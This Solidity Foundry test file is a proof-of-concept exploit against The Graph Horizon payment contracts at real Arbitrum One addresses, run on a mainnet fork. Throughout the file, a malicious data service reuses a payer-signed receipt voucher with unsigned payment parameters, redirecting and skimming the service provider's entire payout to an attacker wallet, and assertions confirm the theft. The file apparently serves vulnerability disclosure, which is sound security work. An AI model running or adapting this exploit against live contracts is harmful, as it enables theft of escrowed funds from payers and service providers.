// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IGraphToken} from "@graphprotocol/interfaces/contracts/contracts/token/IGraphToken.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";
import {IPaymentsEscrow} from "@graphprotocol/interfaces/contracts/horizon/IPaymentsEscrow.sol";
import {IHorizonStaking} from "@graphprotocol/interfaces/contracts/horizon/IHorizonStaking.sol";

interface IGraphTallyCollectorStorage is IGraphTallyCollector {
    function tokensCollected(address dataService, bytes32 collectionId, address receiver, address payer)
        external
        view
        returns (uint256);
}

contract UnsignedRavPaymentParamsPoC is Test {
    IGraphToken private constant GRT = IGraphToken(0x9623063377AD1B27544C965cCd7342f7EA7e88C7);
    IHorizonStaking private constant STAKING = IHorizonStaking(0x00669A4CF01450B64E8A2A20E9b1FCB71E61eF03);
    IPaymentsEscrow private constant ESCROW = IPaymentsEscrow(0xf6Fcc27aAf1fcD8B254498c9794451d82afC673E);
    IGraphPayments private constant PAYMENTS = IGraphPayments(0x7Aae8ae011927BC36Cb4d0d3e81f2E6E30daE06D);
    IGraphTallyCollectorStorage private constant COLLECTOR =
        IGraphTallyCollectorStorage(0x8f69F5C07477Ac46FBc491B1E6D91E2bb0111A9e);

    uint256 private constant PAYER_PRIVATE_KEY = 0xA11CE;
    uint256 private constant SIGNER_PRIVATE_KEY = 0xB0B;
    uint256 private constant PROVISION_AMOUNT = 1 ether;
    uint256 private constant RAV_AMOUNT = 20_000_000 ether;
    uint256 private constant ATTACKER_DATA_SERVICE_CUT = 500_000;
    bytes32 private constant COLLECTION_ID = keccak256("unsigned payment params poc");

    address private payer;
    address private signer;
    address private serviceProvider;
    address private maliciousDataService;
    address private attackerDestination;

    function testUnsignedPaymentParamsRedirectAndSkimProviderPayout() external {
        require(block.chainid == 42161, "run on an Arbitrum One fork");

        _setActors();
        _provisionMaliciousDataService();
        _depositEscrowAndAuthorizeSigner();

        IGraphTallyCollector.SignedRAV memory signedRAV = _signRAV(_rav(), SIGNER_PRIVATE_KEY);
        assertEq(COLLECTOR.recoverRAVSigner(signedRAV), signer);

        bytes memory honestPayload = abi.encode(signedRAV, uint256(0), serviceProvider);
        bytes memory attackerPayload = abi.encode(signedRAV, ATTACKER_DATA_SERVICE_CUT, attackerDestination);
        assertTrue(keccak256(honestPayload) != keccak256(attackerPayload));

        _collectWithUnsignedPaymentParams(attackerPayload);
    }

    function _setActors() private {
        payer = vm.addr(PAYER_PRIVATE_KEY);
        signer = vm.addr(SIGNER_PRIVATE_KEY);
        serviceProvider = makeAddr("honest service provider");
        maliciousDataService = makeAddr("malicious data service");
        attackerDestination = makeAddr("attacker payout wallet");
    }

    function _provisionMaliciousDataService() private {
        vm.deal(serviceProvider, 1 ether);
        deal(address(GRT), serviceProvider, PROVISION_AMOUNT);

        // The malicious data service is a valid Horizon verifier for this service provider on the fork.
        vm.startPrank(serviceProvider);
        GRT.approve(address(STAKING), PROVISION_AMOUNT);
        STAKING.stake(PROVISION_AMOUNT);
        STAKING.provision(serviceProvider, maliciousDataService, PROVISION_AMOUNT, 0, 0);
        vm.stopPrank();
        assertEq(STAKING.getProviderTokensAvailable(serviceProvider, maliciousDataService), PROVISION_AMOUNT);
    }

    function _depositEscrowAndAuthorizeSigner() private {
        vm.deal(payer, 1 ether);
        deal(address(GRT), payer, RAV_AMOUNT);

        // The payer authorizes a signer and deposits GRT into the real deployed escrow for this collector/provider tuple.
        vm.startPrank(payer);
        GRT.approve(address(ESCROW), RAV_AMOUNT);
        ESCROW.deposit(address(COLLECTOR), serviceProvider, RAV_AMOUNT);
        vm.stopPrank();
        _authorizeSigner(payer, signer, SIGNER_PRIVATE_KEY);
        assertEq(ESCROW.getBalance(payer, address(COLLECTOR), serviceProvider), RAV_AMOUNT);
    }

    function _rav() private view returns (IGraphTallyCollector.ReceiptAggregateVoucher memory) {
        return IGraphTallyCollector.ReceiptAggregateVoucher({
            collectionId: COLLECTION_ID,
            payer: payer,
            serviceProvider: serviceProvider,
            dataService: maliciousDataService,
            timestampNs: uint64(block.timestamp * 1e9),
            valueAggregate: uint128(RAV_AMOUNT),
            metadata: abi.encode("payer approved serviceProvider/dataService/value only")
        });
    }

    function _collectWithUnsignedPaymentParams(bytes memory attackerPayload) private {
        uint256 protocolCut = _mulPPMRoundUp(RAV_AMOUNT, PAYMENTS.PROTOCOL_PAYMENT_CUT());
        uint256 postProtocolAmount = RAV_AMOUNT - protocolCut;
        uint256 dataServiceSkim = _mulPPMRoundUp(postProtocolAmount, ATTACKER_DATA_SERVICE_CUT);
        uint256 redirectedToAttacker = postProtocolAmount - dataServiceSkim;
        uint256 attackerBalanceBefore = GRT.balanceOf(attackerDestination);
        uint256 dataServiceBalanceBefore = GRT.balanceOf(maliciousDataService);
        uint256 providerBalanceBefore = GRT.balanceOf(serviceProvider);
        uint256 providerStakeBefore = STAKING.getStake(serviceProvider);

        // The signed RAV is unchanged, but the caller chooses payment parameters that the payer never signed.
        vm.prank(maliciousDataService);
        uint256 collected = COLLECTOR.collect(IGraphPayments.PaymentTypes.QueryFee, attackerPayload);

        assertEq(collected, RAV_AMOUNT);
        assertEq(GRT.balanceOf(maliciousDataService) - dataServiceBalanceBefore, dataServiceSkim);
        assertEq(GRT.balanceOf(attackerDestination) - attackerBalanceBefore, redirectedToAttacker);
        assertGt(dataServiceSkim, 0);
        assertGt(redirectedToAttacker, 0);
        assertEq(protocolCut + dataServiceSkim + redirectedToAttacker, RAV_AMOUNT);
        assertEq(GRT.balanceOf(serviceProvider), providerBalanceBefore);
        assertEq(STAKING.getStake(serviceProvider), providerStakeBefore);
        assertEq(ESCROW.getBalance(payer, address(COLLECTOR), serviceProvider), 0);
        assertEq(COLLECTOR.tokensCollected(maliciousDataService, COLLECTION_ID, serviceProvider, payer), RAV_AMOUNT);
    }

    function _authorizeSigner(address authorizer, address authorizedSigner, uint256 signerPrivateKey) private {
        uint256 proofDeadline = block.timestamp + 1 hours;
        bytes32 messageHash = keccak256(
            abi.encodePacked(block.chainid, address(COLLECTOR), "authorizeSignerProof", proofDeadline, authorizer)
        );
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);

        vm.prank(authorizer);
        COLLECTOR.authorizeSigner(authorizedSigner, proofDeadline, abi.encodePacked(r, s, v));
        assertTrue(COLLECTOR.isAuthorized(authorizer, authorizedSigner));
    }

    function _signRAV(IGraphTallyCollector.ReceiptAggregateVoucher memory rav, uint256 signerPrivateKey)
        private
        view
        returns (IGraphTallyCollector.SignedRAV memory)
    {
        bytes32 digest = COLLECTOR.encodeRAV(rav);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);
        return IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)});
    }

    function _mulPPMRoundUp(uint256 value, uint256 ppm) private pure returns (uint256) {
        if (value == 0 || ppm == 0) {
            return 0;
        }
        return (value * ppm + 1_000_000 - 1) / 1_000_000;
    }
}
